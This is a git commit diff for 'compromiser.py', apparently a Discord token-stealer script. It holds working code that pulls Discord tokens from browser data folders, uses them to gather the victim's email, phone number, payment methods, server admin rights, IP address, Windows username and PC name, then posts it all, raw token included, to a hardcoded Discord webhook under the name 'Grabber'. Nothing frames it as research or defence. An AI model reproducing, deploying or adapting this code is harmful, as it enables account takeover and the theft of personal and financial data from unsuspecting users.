1384abd07a803ee27195239a52706bbd5faab753
kaki869 <thexor7@gmail.com>
2025-11-09 11:26:44 +0000

    Update compromiser.py

--- compromiser.py
+++ compromiser.py
@@ -8,7 +8,6 @@ import urllib.request
 import re
 import base64
 import datetime
-import requests
 
 def install_import(modules):
     for module, pip_name in modules:
@@ -50,8 +49,6 @@ PATHS = {
     'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"  # Replace with your actual webhook URL
-
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -59,7 +56,7 @@ def getheaders(token=None):
     }
 
     if token:
-        headers.update({"Authorization": f"Bearer {token}"})
+        headers.update({"Authorization": token})
 
     return headers
 
@@ -91,20 +88,12 @@ def getkey(path):
 
     return key
 
-def getipwhois_data():
+def getip():
     try:
-        with urllib.request.urlopen("https://ipwho.is/json/") as response:
-            return json.loads(response.read().decode())
-    except Exception as e:
-        return {"error": str(e)}
-
-def send_to_discord(embed):
-    payload = {"embeds": [embed]}
-    response = requests.post(WEBHOOK_URL, json=payload)
-    if response.status_code == 204:
-        print("Message sent successfully!")
-    else:
-        print(f"Failed to send message: {response.status_code} {response.text}")
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
 
 def main():
     checked = []
@@ -146,7 +135,7 @@ def main():
                         res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                         vanity = ""
 
-                        if res["vanity_url_code"] is not None:
+                        if res["vanity_url_code"] != None:
                             vanity = f"""; .gg/{res["vanity_url_code"]}"""
 
                         guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
@@ -159,19 +148,23 @@ def main():
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = res[0].get("current_period_end")
+                    if exp_date:
+                        exp_date = datetime.datetime.strptime(exp_date, "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
                 res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
                 print_boost = ""
                 boost = False
                 for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                        print_boost += f"ㅤ- Available now\n"
-                        available += 1
-                    else:
-                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    cooldown = id.get("cooldown_ends_at")
+                    if cooldown:
+                        cooldown = datetime.datetime.strptime(cooldown, "%Y-%m-%dT%H:%M:%S.%f%z")
+                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                            print_boost += f"ㅤ- Available now\n"
+                            available += 1
+                        else:
+                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                     boost = True
                 if boost:
                     badges += f":BadgeBoost: "
@@ -194,21 +187,24 @@ def main():
                 print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
-                ip_data = getipwhois_data()
                 embed_user = {
-                    'title': f"**New user data: {res_json['username']}**",
-                    'description': f"""
-                        ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {ip_data.get("ip")}\nMore details: https://ipwho.is/{ip_data.get("ip")}```yaml\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
-                    'color': 3092790,
-                    'footer': {
-                        'text': "Made by Astraa ・ https://github.com/astraadev"
-                    },
-                    'thumbnail': {
-                        'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
-                    }
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made By Ryzen"
+                            },
+                            'thumbnail': {
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
                 }
 
-                send_to_discord(embed_user)
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
